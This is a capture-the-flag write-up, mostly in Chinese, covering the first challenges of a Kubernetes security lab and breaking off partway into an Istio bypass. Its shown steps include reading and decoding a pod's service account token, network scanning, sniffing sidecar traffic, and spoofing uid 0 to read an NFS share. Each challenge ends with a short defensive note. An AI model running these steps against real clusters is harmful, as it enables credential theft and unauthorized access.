&lt;p>As a warmup, utilize &lt;a href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">DNS scanning&lt;/a> to uncover hidden internal services and obtain the flag. We have &amp;ldquo;loaded your machine with &lt;a href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e">dnscan&lt;/a> to ease this process for further challenges.&lt;/p>
&lt;h3 id="提示">提示&lt;/h3>
&lt;p>在 Kubernetes 集群中进行侦查时，可以使用多种方法来收集信息和发现资源。以下是从&lt;a href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">DNS scanning&lt;/a>中整理的几种主要侦查方式及其说明和使用场景：&lt;/p>
&lt;ol>
&lt;li>环境变量检查&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>说明
&lt;ul>
&lt;li>环境变量通常包含集群中其他服务的 IP 地址和端口，特别是包含字符串 KUBERNETES 的变量，指向 Kubernetes API 服务。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用场景
&lt;ul>
&lt;li>初步收集集群内服务的 IP 地址和端口。&lt;/li>
&lt;li>获取 Kubernetes API 服务器的地址。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>示例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ env | grep KUBERNETES
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>文件系统检查&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>说明
&lt;ul>
&lt;li>检查 /etc/hosts 和 /etc/resolv.conf 文件可以获取 pod 的本地 IP 地址、DNS 服务器地址和 DNS 搜索域，从而推断 pod 的命名空间。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用场景
&lt;ul>
&lt;li>获取 pod 的本地 IP 地址和名称。&lt;/li>
&lt;li>获取集群 DNS 服务器地址和推断命名空间。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>示例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cat /etc/hosts
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat /etc/resolv.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>服务账户令牌检查&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>说明
&lt;ul>
&lt;li>检查 pod 的服务账户令牌文件 /var/run/secrets/kubernetes.io/serviceaccount/token，可以解码令牌以提取声明信息，包括 API 服务器地址、pod 名称和服务账户名称。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用场景
&lt;ul>
&lt;li>获取 Kubernetes API 服务器的地址。&lt;/li>
&lt;li>获取 pod 名称和服务账户名称。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>示例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d &lt;span style="color:#e6db74">&amp;#39;.&amp;#39;&lt;/span> -f &lt;span style="color:#ae81ff">2&lt;/span> | base64 -d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>Kubernetes API 访问&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>说明
&lt;ul>
&lt;li>使用 Kubernetes API 是获取集群中 pod 和服务详细信息的主要方式。可以使用&lt;code>kubectl&lt;/code>工具或&lt;code>curl&lt;/code>命令进行查询。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用场景
&lt;ul>
&lt;li>获取集群中所有 pod 和服务的详细信息。&lt;/li>
&lt;li>检查服务账户令牌的权限。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>示例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ kubectl --token &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>cat /var/run/secrets/kubernetes.io/serviceaccount/token&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> get pods -o wide
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl -H &lt;span style="color:#e6db74">&amp;#34;Authorization: Bearer &lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>cat /var/run/secrets/kubernetes.io/serviceaccount/token&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt https://10.100.0.1/api/v1/namespaces/k8s-lan-party/pods
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
&lt;li>传统的主机和端口发现&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>说明
&lt;ul>
&lt;li>如果无法使用 Kubernetes API，可以使用传统的网络扫描技术来发现主机和服务。可以使用&lt;code>ping&lt;/code>命令检查主机是否在线，使用&lt;code>nmap&lt;/code>进行端口扫描。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用场景
&lt;ul>
&lt;li>在无法访问 Kubernetes API 时，发现集群中的主机和服务。&lt;/li>
&lt;li>识别集群中活动的 IP 地址和开放端口。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>示例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ping 10.96.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ nmap -oG dns_scan_svc_1 -sn -Pn -R 10.96.0.0/16
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="6">
&lt;li>Kubernetes DNS 服务&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>说明
&lt;ul>
&lt;li>Kubernetes DNS 服务自动为集群中的 pod 和服务创建 DNS 记录，可以通过反向 DNS 查找来识别活动的服务和 pod。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用场景
&lt;ul>
&lt;li>识别集群中与服务关联的 IP 地址。&lt;/li>
&lt;li>通过反向 DNS 查找缩小潜在的 IP 范围。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>示例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dig +short -x 10.96.0.10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dig +short SRV _https._tcp.kubernetes.default.svc.cluster.local
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解题">解题&lt;/h3>
&lt;ol>
&lt;li>此题通过env命令可以获得相关信息&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ env
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>KUBERNETES_SERVICE_PORT_HTTPS&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">443&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>KUBERNETES_SERVICE_PORT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">443&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>USER_ID&lt;span style="color:#f92672">=&lt;/span>061d21d7-c07c-49b7-a0cd-957a4f25d8c3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HISTSIZE&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2048&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PWD&lt;span style="color:#f92672">=&lt;/span>/home/player
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HOME&lt;span style="color:#f92672">=&lt;/span>/home/player
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>KUBERNETES_PORT_443_TCP&lt;span style="color:#f92672">=&lt;/span>tcp://10.100.0.1:443
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HISTFILE&lt;span style="color:#f92672">=&lt;/span>/home/player/.bash_history
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TMPDIR&lt;span style="color:#f92672">=&lt;/span>/tmp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TERM&lt;span style="color:#f92672">=&lt;/span>xterm-256color
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SHLVL&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>KUBERNETES_PORT_443_TCP_PROTO&lt;span style="color:#f92672">=&lt;/span>tcp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>KUBERNETES_PORT_443_TCP_ADDR&lt;span style="color:#f92672">=&lt;/span>10.100.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>KUBERNETES_SERVICE_HOST&lt;span style="color:#f92672">=&lt;/span>10.100.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>KUBERNETES_PORT&lt;span style="color:#f92672">=&lt;/span>tcp://10.100.0.1:443
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>KUBERNETES_PORT_443_TCP_PORT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">443&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HISTFILESIZE&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2048&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>_&lt;span style="color:#f92672">=&lt;/span>/usr/bin/env
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>通过题目中提供的&lt;a href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e">dnscan&lt;/a>扫描k8s service 或使用nmap对k8s api service 的网段进行扫描&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nmap -sn -Pn -R 10.100.0.1/16 | grep svc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> getflag-service.k8s-lan-party.svc.cluster.local &lt;span style="color:#f92672">(&lt;/span>10.100.136.254&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ dnscan -subnet 10.100.0.1/16
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10.100.136.254 -&amp;gt; getflag-service.k8s-lan-party.svc.cluster.local.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>通过访问getflag-service.k8s-lan-party.svc.cluster.local 即可获得flag&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl getflag-service.k8s-lan-party.svc.cluster.local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wiz_k8s_lan_party&lt;span style="color:#f92672">{&lt;/span>between-thousands-of-ips-you-found-your-northen-star&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考">思考&lt;/h3>
&lt;p>需避免在上述地方存储敏感数据，若必须存储，则需要进行监控。&lt;/p>
&lt;h2 id="challenge-2-finding-neighbours">Challenge 2: FINDING NEIGHBOURS&lt;/h2>
&lt;h3 id="题目-1">题目&lt;/h3>
&lt;p>Sometimes, it seems we are the only ones around, but we should always be on guard against invisible &lt;a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/">sidecars&lt;/a> reporting sensitive secrets.&lt;/p>
&lt;h3 id="解题-1">解题&lt;/h3>
&lt;p>根据&lt;a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/">sidecars&lt;/a>的内容，可以得知Sidecar容器与主容器共同使用存储与网络namespace。
尝试使用&lt;code>tcpdump&lt;/code>进行网络监听&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ tcpdump -X
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>16:00:16.078369 IP 192.168.23.43.44200 &amp;gt; reporting-service.k8s-lan-party.svc.cluster.local.http: Flags &lt;span style="color:#f92672">[&lt;/span>P.&lt;span style="color:#f92672">]&lt;/span>, seq 1:215, ack 1, win 502, options &lt;span style="color:#f92672">[&lt;/span>nop,nop,TS val &lt;span style="color:#ae81ff">1652472708&lt;/span> ecr 992109221&lt;span style="color:#f92672">]&lt;/span>, length 214: HTTP: POST / HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000: &lt;span style="color:#ae81ff">4500&lt;/span> 010a 2f8a &lt;span style="color:#ae81ff">4000&lt;/span> 7f06 3db1 c0a8 172b E.../.@...&lt;span style="color:#f92672">=&lt;/span>....+
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0010: 0a64 ab7b aca8 &lt;span style="color:#ae81ff">0050&lt;/span> 9d66 d16f f677 63b0 .d.&lt;span style="color:#f92672">{&lt;/span>...P.f.o.wc.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0020: &lt;span style="color:#ae81ff">8018&lt;/span> 01f6 8eaf &lt;span style="color:#ae81ff">0000&lt;/span> &lt;span style="color:#ae81ff">0101&lt;/span> 080a 627e bb84 ............b~..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0030: 3b22 62a5 504f &lt;span style="color:#ae81ff">5354&lt;/span> 202f &lt;span style="color:#ae81ff">2048&lt;/span> &lt;span style="color:#ae81ff">5454&lt;/span> 502f ;&lt;span style="color:#e6db74">&amp;#34;b.POST./.HTTP/
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x0040: 312e 310d 0a48 6f73 743a 2072 6570 6f72 1.1..Host:.repor
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x0050: 7469 6e67 2d73 6572 7669 6365 0d0a 5573 ting-service..Us
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x0060: 6572 2d41 6765 6e74 3a20 6375 726c 2f37 er-Agent:.curl/7
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x0070: 2e36 342e 300d 0a41 6363 6570 743a 202a .64.0..Accept:.*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x0080: 2f2a 0d0a 436f 6e74 656e 742d 4c65 6e67 /*..Content-Leng
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x0090: 7468 3a20 3633 0d0a 436f 6e74 656e 742d th:.63..Content-
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x00a0: 5479 7065 3a20 6170 706c 6963 6174 696f Type:.applicatio
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x00b0: 6e2f 782d 7777 772d 666f 726d 2d75 726c n/x-www-form-url
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x00c0: 656e 636f 6465 640d 0a0d 0a77 697a 5f6b encoded....wiz_k
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x00d0: 3873 5f6c 616e 5f70 6172 7479 7b67 6f6f 8s_lan_party{goo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x00e0: 642d 6372 696d 652d 636f 6d65 732d 7769 d-crime-comes-wi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x00f0: 7468 2d61 2d70 6172 746e 6572 2d69 6e2d th-a-partner-in-
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> 0x0100: 612d 7369 6465 6361 727d a-sidecar}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-1">思考&lt;/h3>
&lt;p>在容器内部尽量避免非必要的工具，例如tcpdump。&lt;/p>
&lt;h2 id="challenge-3-data-leakage">Challenge 3: DATA LEAKAGE&lt;/h2>
&lt;h3 id="题目-2">题目&lt;/h3>
&lt;p>The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based 🤦‍️.&lt;/p>
&lt;h3 id="解题-2">解题&lt;/h3>
&lt;ol>
&lt;li>查看中全部挂载的文件系统。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ df -h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Filesystem Size Used Avail Use% Mounted on
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>overlay 300G 8.4G 292G 3% /
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ 8.0E &lt;span style="color:#ae81ff">0&lt;/span> 8.0E 0% /efs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tmpfs 60G 12K 60G 1% /var/run/secrets/kubernetes.io/serviceaccount
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tmpfs 64M &lt;span style="color:#ae81ff">0&lt;/span> 64M 0% /dev/null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>查看包含重要信息的挂载文件系统的详细信息。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ mount |grep /efs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 &lt;span style="color:#f92672">(&lt;/span>ro,relatime,vers&lt;span style="color:#f92672">=&lt;/span>4.1,rsize&lt;span style="color:#f92672">=&lt;/span>1048576,wsize&lt;span style="color:#f92672">=&lt;/span>1048576,namlen&lt;span style="color:#f92672">=&lt;/span>255,hard,noresvport,proto&lt;span style="color:#f92672">=&lt;/span>tcp,timeo&lt;span style="color:#f92672">=&lt;/span>600,retrans&lt;span style="color:#f92672">=&lt;/span>2,sec&lt;span style="color:#f92672">=&lt;/span>sys,clientaddr&lt;span style="color:#f92672">=&lt;/span>192.168.57.108,local_lock&lt;span style="color:#f92672">=&lt;/span>none,addr&lt;span style="color:#f92672">=&lt;/span>192.168.124.98&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>上述结果显示其 NFSv4 文件系统被挂载在 &lt;code>/efs&lt;/code> 目录上，并且以只读模式进行访问。
首先使用 &lt;code>nfs-ls&lt;/code> 查看内容。根据&lt;a href="https://github.com/sahlberg/libnfs">libnfs 文档&lt;/a>，此工具默认使用 NFSv3，可以使用 URL 参数 &lt;code>version=4&lt;/code> 来选择 NFSv4。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>---------- &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">73&lt;/span> flag.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>直接使用&lt;code>nfs-cat&lt;/code>提取文件内容，会获得权限不足错误&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nfs-cat nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Failed to open file /flag.txt: open call failed with &lt;span style="color:#e6db74">&amp;#34;NFS4: (path /) failed with NFS4ERR_ACCESS(-13)&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Failed to open nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
&lt;li>根据&lt;a href="https://github.com/sahlberg/libnfs">libnfs 文档&lt;/a>，可以通过参数伪造uid。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nfs-cat &lt;span style="color:#e6db74">&amp;#34;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&amp;amp;uid=0&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wiz_k8s_lan_party&lt;span style="color:#f92672">{&lt;/span>old-school-network-file-shares-infiltrated-the-cloud!&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-2">思考&lt;/h3>
&lt;p>避免不安全的NFS配置。&lt;/p>
&lt;h2 id="challenge-4-bypassing-boundaries">Challenge 4: BYPASSING BOUNDARIES&lt;/h2>
&lt;h3 id="题目-3">题目&lt;/h3>
&lt;p>Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don&amp;rsquo;t abuse this power; use it responsibly and with caution.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">apiVersion&lt;/span>: &lt;span style="color:#ae81ff">security.istio.io/v1beta1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">kind&lt;/span>: &lt;span style="color:#ae81ff">AuthorizationPolicy&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">metadata&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">name&lt;/span>: &lt;span style="color:#ae81ff">istio-get-flag&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">namespace&lt;/span>: &lt;span style="color:#ae81ff">k8s-lan-party&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">spec&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">action&lt;/span>: &lt;span style="color:#ae81ff">DENY&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">selector&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">matchLabels&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">app&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;{flag-pod-name}&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">rules&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#f92672">from&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#f92672">source&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">namespaces&lt;/span>: [&lt;span style="color:#e6db74">&amp;#34;k8s-lan-party&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">to&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - &lt;span style="color:#f92672">operation&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">methods&lt;/span>: [&lt;span style="color:#e6db74">&amp;#34;POST&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;GET&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解题-3">解题&lt;/h3>
&lt;ol>
&lt;li>扫描&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># dnscan -subnet 10.100.0.1/16&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10.100.224.159 -&amp;gt; istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>尝试访问&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>RBAC: access denied
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>根据&lt;a href="https://github.com/istio/istio/issues/4286">issues&lt;/a>以及&lt;a href="https://istio.io/v1.11/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf">Istio Security Assessment&lt;/a>，攻击者可以通过创建 UID 1337 的用户并以该用户身份运行，从而绕过 Envoy 对出站流量的监控。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># cat /etc/passwd |grep 1337&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>istio:x:1337:1337::/home/istio:/bin/sh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
